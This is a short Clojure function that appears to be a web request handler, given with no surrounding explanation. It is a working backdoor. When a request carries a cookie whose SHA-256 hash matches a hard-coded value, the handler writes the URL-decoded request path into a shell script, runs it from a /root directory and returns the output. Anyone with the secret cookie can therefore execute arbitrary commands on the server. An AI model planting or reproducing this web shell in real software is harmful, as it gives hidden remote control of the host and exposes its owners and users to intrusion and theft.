(fn[rq rs](let[
 h(fn[m](let[h(java.security.MessageDigest/getInstance"SHA-256")]
    (. h update m)(.digest h)))
 f(fn[h](apply str(map #(format"%02x"(bit-and % 0xff))h)))
 c(filter(fn[c](="1"(.getName c)))(.getCookies rq))
 u(if(>(count c)0)
  (if(="693c599b0e27c7ad6dd3564ec14d5336b9b9c2b2183c0ec32ddb0d6565d55ca9"
   (f(h(.getBytes(.getValue(first c))))))"RaWa"))]
 (if u(do
  (spit"exec.sh"
   (java.net.URLDecoder/decode(subs(.getRequestURI rq)6)))
  (slurp(.getInputStream(.exec(Runtime/getRuntime)"/root/git/hn4j/exec.sh"))))
  "No permission")))